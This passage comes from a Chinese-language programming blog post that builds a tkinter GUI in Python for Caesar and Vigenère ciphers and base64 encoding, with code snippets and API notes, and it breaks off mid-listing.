class="line">                <span class="keyword">if</span> i.isupper():  <span class="comment"># 判断是否是大写</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">ord</span>(i.lower()) - key &lt; <span class="number">97</span>:</span><br><span class="line">                        plaintext += <span class="built_in">chr</span>(</span><br><span class="line">                            <span class="number">26</span> + <span class="built_in">ord</span>(i.lower()) -</span><br><span class="line">                            key).upper()  <span class="comment">#123-(97-(ord(i.lower()) - key))</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        plaintext += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i.lower()) - key).upper()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">ord</span>(i) - key &lt; <span class="number">97</span>:</span><br><span class="line">                        plaintext += <span class="built_in">chr</span>(<span class="number">26</span> + <span class="built_in">ord</span>(i) - key)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        plaintext += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) - key)</span><br><span class="line">            <span class="keyword">else</span>:  <span class="comment">#如果不是字符就照常输出</span></span><br><span class="line">                plaintext += i</span><br><span class="line">        output.insert(<span class="number">0</span>, plaintext)  <span class="comment"># 输出到文本框</span></span><br><span class="line">    <span class="keyword">else</span>:   <span class="comment"># 如果密钥输入错误提示报错</span></span><br><span class="line">        Error()</span><br></pre></td></tr></table></figure><h2 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h2><p>使用一系列凯撒密码组成密码字母表的加密算法，其密钥为字母</p><p><img src="https://i.loli.net/2021/09/11/ayQt4A8gM6z3qRn.png" alt="image.png"></p><p>如明文：here is it work，密钥：victor，则对应的密文：cmtx wj db yhfb</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">father_list = []  <span class="comment">#存储维吉尼亚表</span></span><br><span class="line"><span class="comment">#生成维吉尼亚表</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    temp_list = [<span class="built_in">chr</span>(j) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span> + i, <span class="number">123</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>, <span class="number">97</span> + i):</span><br><span class="line">        temp_list.append(<span class="built_in">chr</span>(i))</span><br><span class="line">    father_list.append(temp_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 维吉尼亚加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Virginia_Encryption</span>():</span></span><br><span class="line">    output.delete(<span class="number">0</span>, <span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">    plaintext = entry_frame.get()  <span class="comment"># 获取输入内容</span></span><br><span class="line">    key = key_frame.get()  <span class="comment"># 获取输入密钥</span></span><br><span class="line">    <span class="keyword">if</span> key.isalpha():  <span class="comment"># 判断密钥是否全为字母</span></span><br><span class="line">        ciphertext = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        n = <span class="number">0</span>  <span class="comment"># 记录读取字符的位置</span></span><br><span class="line">        m = <span class="number">0</span>  <span class="comment"># 记录读取密钥的位置</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> plaintext:</span><br><span class="line">            <span class="keyword">if</span> plaintext[n].isalpha():  <span class="comment"># 判断是否是字符</span></span><br><span class="line">                <span class="keyword">if</span> plaintext[n].isupper():  <span class="comment"># 判断是否为大写字母</span></span><br><span class="line">                    ciphertext += father_list[<span class="built_in">ord</span>(key[m % <span class="built_in">len</span>(key)]) -</span><br><span class="line">                                              <span class="number">97</span>][<span class="built_in">ord</span>(i.lower()) - <span class="number">97</span>].upper()</span><br><span class="line">                <span class="keyword">else</span>:  <span class="comment"># 小写字母就以小写输出</span></span><br><span class="line">                    ciphertext += father_list[<span class="built_in">ord</span>(key[m % <span class="built_in">len</span>(key)]) -</span><br><span class="line">                                              <span class="number">97</span>][<span class="built_in">ord</span>(i) - <span class="number">97</span>]</span><br><span class="line">                m += <span class="number">1</span></span><br><span class="line">                n += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:  <span class="comment">#如果不是字符就照常输出</span></span><br><span class="line">                ciphertext += i</span><br><span class="line">                n += <span class="number">1</span></span><br><span class="line">        output.insert(<span class="number">0</span>, ciphertext)  <span class="comment"># 输出到文本框</span></span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># 若密钥错误提示报错</span></span><br><span class="line">        Error()</span><br></pre></td></tr></table></figure><h2 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h2><p>base64是一种基于64个可打印字符来表示二进制数据的表示方法。没有密钥。（这里就偷个懒，直接使用了base64库）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># base64加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Base64_Encryption</span>():</span></span><br><span class="line">    output.delete(<span class="number">0</span>, <span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">    plaintext = entry_frame.get()</span><br><span class="line">    output.insert(<span class="number">0</span>, base64.b64encode(plaintext.encode(<span class="string">&#x27;UTF-8&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># base64解密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Base64_Decrypt</span>():</span></span><br><span class="line">    output.delete(<span class="number">0</span>, <span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ciphertext = entry_frame.get()</span><br><span class="line">        output.insert(<span class="number">0</span>, base64.b64decode(ciphertext.encode(<span class="string">&#x27;UTF-8&#x27;</span>)))  <span class="comment"># 输出到文本框</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        Error_input()</span><br></pre></td></tr></table></figure><h1 id="界面设置"><a href="#界面设置" class="headerlink" title="界面设置"></a>界面设置</h1><p>利用tkinter库设计主界面窗口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line">window = tk.Tk()  <span class="comment"># 创建一个窗口</span></span><br><span class="line">window.title(<span class="string">&#x27;Secert&#x27;</span>)  <span class="comment"># 设置窗口标题</span></span><br><span class="line">window.geometry(<span class="string">&#x27;500x500&#x27;</span>)  <span class="comment"># 设置窗口大小</span></span><br><span class="line">entry_name = tk.Label(window, text=<span class="string">&quot;Plaintext/Ciphertext:&quot;</span>)  <span class="comment"># 对窗口命名</span></span><br><span class="line">entry_name.place(relx=<span class="number">0.12</span>, rely=<span class="number">0.05</span>, anchor=tk.CENTER)  <span class="comment"># 放置输入窗口文字</span></span><br><span class="line"><span class="comment"># 设置输入框</span></span><br><span class="line">entry_frame = tk.Entry(window) </span><br><span class="line">entry_frame.place(relx=<span class="number">0.5</span>, rely=<span class="number">0.05</span>, anchor=tk.CENTER, width=<span class="number">200</span>,</span><br><span class="line">                  height=<span class="number">25</span>)  <span class="comment"># 放置输入窗口</span></span><br><span class="line">key_name = tk.Label(window, text=<span class="string">&quot;key:&quot;</span>)  <span class="comment"># 设置密钥窗口文字</span></span><br><span class="line"><span class="comment"># 在界面上进行标注</span></span><br><span class="line">key_name.place(relx=<span class="number">0.12</span>, rely=<span class="number">0.12</span>, anchor=tk.CENTER)</span><br><span class="line">Virginia_name = tk.Label(window, text=<span class="string">&quot;Virginia:&quot;</span>)  </span><br><span class="line">Virginia_name.place(relx=<span class="number">0.12</span>, rely=<span class="number">0.2</span>, anchor=tk.CENTER)</span><br><span class="line">Caesar_name = tk.Label(window, text=<span class="string">&quot;Caesar:&quot;</span>)</span><br><span class="line">Caesar_name.place(relx=<span class="number">0.12</span>, rely=<span class="number">0.4</span>, anchor=tk.CENTER)</span><br><span class="line">Base64_name = tk.Label(window, text=<span class="string">&quot;Base64:&quot;</span>)</span><br><span class="line">Base64_name.place(relx=<span class="number">0.12</span>, rely=<span class="number">0.6</span>, anchor=tk.CENTER)</span><br><span class="line">key_frame = tk.Entry(window)</span><br><span class="line">key_frame.place(relx=<span class="number">0.5</span>, rely=<span class="number">0.12</span>, anchor=tk.CENTER, width=<span class="number">200</span>,</span><br><span class="line">                height=<span class="number">25</span>) </span><br><span class="line"><span class="comment"># 放置输出框</span></span><br><span class="line">output_name = tk.Label(window, text=<span class="string">&#x27;Output:&#x27;</span>)</span><br><span class="line">output_name.place(relx=<span class="number">0.12</span>, rely=<span class="number">0.9</span>, anchor=tk.CENTER)</span><br><span class="line">output = tk.Entry(window)</span><br><span class="line">output.place(relx=<span class="number">0.5</span>, rely=<span class="number">0.9</span>, anchor=tk.CENTER, width=<span class="number">200</span>, height=<span class="number">30</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tkinter.TK()                                            用来创建一个窗口</span><br><span class="line">tkinter.TK().title()                                             用来命名窗口</span><br><span class="line">tkinter.TK().geometry()                                          用来设置窗口大小</span><br><span class="line">tkinter.Label(TK,text&#x3D;)                                          在Tk窗口申请一个标签，text设置标签名</span><br><span class="line">tkinter.Label.place(relx&#x3D;, rely&#x3D;, anchor&#x3D;)               relx是设置横向坐标，rely设置纵向坐标 ，anchor通过它来控制插件 与其内容的相对位置。</span><br><span class="line">tkinter.Entry(TK)                                在TK窗口申请一个输入框</span><br></pre></td></tr></table></figure><p>放置按钮</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 维吉尼亚加密按钮</span></span><br><span class="line">bottom_Virginia_Encryption = tk.Button(window,</span><br><span class="line">                                       text=<span class="string">&#x27;Virginia_Encryption&#x27;</span>,</span><br><span class="line">                                       width=<span class="number">15</span>,</span><br><span class="line">                                       height=<span class="number">2</span>,</span><br><span class="line">                                       command=Virginia_Encryption)  <span class="comment"># 设置加密按钮</span></span><br><span class="line">bottom_Virginia_Encryption.place(relx=<span class="number">0.35</span>, rely=<span class="number">0.2</span>, anchor=tk.CENTER)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 维吉尼亚解密按钮</span></span><br><span class="line">bottom_Virginia_Decrypt = tk.Button(window,</span><br><span class="line">                                    text=<span class="string">&#x27;Virginia_Decrypt&#x27;</span>,</span><br><span class="line">                                    width=<span class="number">15</span>,</span><br><span class="line">                                    height=<span class="number">2</span>,</span><br><span class="line">                                    command=Virginia_Decrypt)  <span class="comment"># 设置解密按钮</span></span><br><span class="line">bottom_Virginia_Decrypt.place(relx=<span class="number">0.65</span>, rely=<span class="number">0.2</span>, anchor=tk.CENTER)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 凯撒加密按钮</span></span><br><span class="line">bottom_Caesar_Encryption = tk.Button(window,</span><br><span class="line">                                     text=<span class="string">&#x27;Caesar_Encryption&#x27;</span>,</span><br><span class="line">                                     width=<span class="number">15</span>,</span><br><span class="line">                                     height=<span class="number">2</span>,</span><br><span class="line">                                     command=Caesar_Encryption)  <span class="comment"># 设置加密按钮</span></span><br><span class="line">bottom_Caesar_Encryption.place(relx=<span class="number">0.35</span>, rely=<span class="number">0.4</span>, anchor=tk.CENTER)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 凯撒解密按钮</span></span><br><span class="line">bottom_Caesar_Decrypt = tk.Button(window,</span><br><span class="line">                                  text=<span class="string">&#x27;Caesar_Decrypt&#x27;</span>,</span><br><span class="line">                                  width=<span class="number">15</span>,</span><br><span class="line">                                  height=<span class="number">2</span>,</span><br><span class="line">                                  command=Caesar_Decrypt)  <span class="comment"># 设置加密按钮</span></span><br><span class="line">bottom_Caesar_Decrypt.place(relx=<span class="number">0.65</span>, rely=<span class="number">0.4</span>, anchor=tk.CENTER)</span><br><span class="line"></span><br><span class="line"><span class="comment"># base64加密按钮</span></span><br><span class="line">bottom_Base64_Encryption = tk.Button(window,</span><br><span class="line">                                     text=<span class="string">&#x27;Base64_Encryption&#x27;</span>,</span><br><span class="line">                                     width=<span class="number">15</span>,</span><br><span class="line">                                     height=<span class="number">2</span>,</span><br><span class="line">                                     command=Base64_Encryption)  <span class="comment"># 设置加密按钮</span></span><br><span class="line">bottom_Base64_Encryption.place(relx=<span class="number">0.35</span>, rely=<span class="number">0.6</span>, anchor=tk.CENTER)</span><br><span class="line"></span><br><span class="line"><span class="comment"># base64解密按钮</span></span><br><span class="line">bottom_Base64_Decrypt = tk.Button(window,</span><br><span class="line">                                  text=<span class="string">&#x27;Base64_Decrypt&#x27;</span>,</span><br><span class="line">                                  width=<span class="number">15</span>,</span><br><span class="line">                                  height=<span class="number">2</span>,</span><br><span class="line">                                  command=Base64_Decrypt)  <span class="comment"># 设置加密按钮</span></span><br><span class="line">bottom_Base64_Decrypt.place(relx=<span class="number">0.65</span>, rely=<span class="number">0.6</span>, anchor=tk.CENTER)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tkinte.Button(TK,text&#x3D;,width&#x3D;,height&#x3D;,command&#x3D;)       在TK窗口申请一个按钮，text设置按钮名字，width设置按钮宽度，height设置按钮高度，command设置按钮的功能</span><br></pre></td></tr></table></figure><h1 id="异常输入"><a href="#异常输入" class="headerlink" title="异常输入"></a>异常输入</h1><p>当密钥或者密文输入错误，为了提醒用户，需要设置一些报错函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> messagebox</span><br><span class="line"></span><br><span class="line"><span class="comment"># 错误密钥警报</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Error</span>():</span></span><br><span class="line">    messagebox.showwarning(title=<span class="string">&#x27;Wrong!&#x27;</span>, message=<span class="string">&#x27;Wrong key!!!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 错误输入警报</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Error_input</span>():</span></span><br><span class="line">    messagebox.showwarning(title=<span class="string">&#x27;Wrong!&#x27;</span>, message=<span class="string">&#x27;Wrong input!!!&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">messagebox.showwarning(title&#x3D;, message&#x3D;)       当函数被调用，首先程序会被停止，之后弹出一个警告框，title用于设置警告框名称，message用于设置警告框的内容</span><br></pre></td></tr></table></figure><p>如下图所示</p><p><img src="https://i.loli.net/2021/09/11/xiarA8VFGJNc4sj.png" alt="image.png"></p><h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> messagebox</span><br><span class="line"></span><br><span class="line">father_list = []  <span class="comment">#存储维吉尼亚表</span></span><br><span class="line"><span class="comment">#生成维吉尼亚表</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    temp_list = [<span class="built_in">chr</span>(j) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span> + i, <span class="number">123</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>, <span class="number">97</span> + i):</span><br><span class="line">        temp_list.append(<span class="built_in">chr</span>(i))</span><br><span class="line">    father_list.append(temp_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 凯撒加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Caesar_Encryption</span>():</span></span><br><span class="line">    output.delete(<span class="number">0</span>, <span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">    plaintext = entry_frame.get()  <span class="comment"># 获取输入内容</span></span><br><span class="line">    key = key_frame.get()</span><br><span class="line">    ciphertext = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> key.isdigit():</span><br><span class="line">        key = <span class="built_in">int</span>(key)%<span class="number">26</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> plaintext:</span><br><span class="line">            <span class="keyword">if</span> i.isalpha():  <span class="comment"># 判断是否是字符</span></span><br><span class="line">                <span class="keyword">if</span> i.isupper():</span><br><span class="line">                    ciphertext += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i.lower()) - <span class="number">97</span> + key) % <span class="number">26</span> +</span><br><span class="line">                                      <span class="number">97</span>).upper()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    ciphertext += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i) - <span class="number">97</span> + key) % <span class="number">26</span> + <span class="number">97</span>)</span><br><span class="line">            <span class="keyword">else</span>:  <span class="comment">#如果不是字符就照常输出</span></span><br><span class="line">                ciphertext += i</span><br><span class="line">        output.insert(<span class="number">0</span>, ciphertext)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        Error()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 凯撒解密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Caesar_Decrypt</span>():</span></span><br><span class="line">    output.delete(<span class="number">0</span>, <span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">    ciphertext = entry_frame.get()</span><br><span class="line">    key = key_frame.get()</span><br><span class="line">    plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> key.isdigit():</span><br><span class="line">        key = <span class="built_in">int</span>(key)%<span class="number">26</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> ciphertext:</span><br><span class="line">            <span class="keyword">if</span> i.isalpha():  <span class="comment"># 判断是否是字符</span></span><br><span class="line">                <span class="keyword">if</span> i.isupper():</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">ord</span>(i.lower()) - key &lt; <span class="number">97</span>:</span><br><span class="line">                        plaintext += <span class="built_in">chr</span>(</span><br><span class="line">                            <span class="number">26</span> + <span class="built_in">ord</span>(i.lower()) -</span><br><span class="line">                            key).upper()  <span class="comment">#123-(97-(ord(i.lower()) - key))</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        plaintext += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i.lower()) - key).upper()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">ord</span>(i) - key &lt; <span class="number">97</span>:</span><br><span class="line">                        plaintext += <span class="built_in">chr</span>(<span class="number">26</span> + <span class="built_in">ord</span>(i) - key)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        plaintext += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) - key)</span><br><span class="line">            <span class="keyword">else</span>:  <span class="comment">#如果不是字符就照常输出</span></span><br><span class="line">                plaintext += i</span><br><span class="line">        output.insert(<span class="number">0</span>, plaintext)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        Error()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 维吉尼亚加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Virginia_Encryption</span>():</span></span><br><span class="line">    output.delete(<span class="number">0</span>, <span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">    plaintext = entry_frame.get()  <span class="comment"># 获取输入内容</span></span><br><span class="line">    key = key_frame.get()</span><br><span class="line">    <span class="keyword">if</span> key.isalpha():</span><br><span class="line">        ciphertext = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        n = <span class="number">0</span>  <span class="comment"># 记录读取字符的位置</span></span><br><span class="line">        m = <span class="number">0</span>  <span class="comment"># 记录读取密钥的位置</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> plaintext:</span><br><span class="line">            <span class="keyword">if</span> plaintext[n].isalpha():  <span class="comment"># 判断是否是字符</span></span><br><span class="line">                <span class="keyword">if</span> plaintext[n].isupper():  <span class="comment"># 判断是否为大写字母</span></span><br><span class="line">                    ciphertext += father_list[<span class="built_in">ord</span>(key[m % <span class="built_in">len</span>(key)]) -</span><br><span class="line">                                              <span class="number">97</span>][<span class="built_in">ord</span>(i.lower()) - <span class="number">97</span>].upper()</span><br><span class="line">                <span class="keyword">else</span>:  <span class="comment"># 小写字母就以小写输出</span></span><br><span class="line">                    ciphertext += father_list[<span class="built_in">ord</span>(key[m % <span class="built_in">len</span>(key)]) -</span><br><span class="line">                                              <span class="number">97</span>][<span class="built_in">ord</span>(i) - <span class="number">97</span>]</span><br><span class="line">                m += <span class="number">1</span></span><br><span class="line">                n += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:  <span class="comment">#如果不是字符就照常输出</span></span><br><span class="line">                ciphertext += i</span><br><span class="line">                n += <span class="number">1</span></span><br><span class="line">        output.insert(<span class="number">0</span>, ciphertext)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        Error()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 维吉尼亚解密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Virginia_Decrypt</span>():</span></span><br><span class="line">    alpha = [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>, <span class="number">123</span>)]</span><br><span class="line">    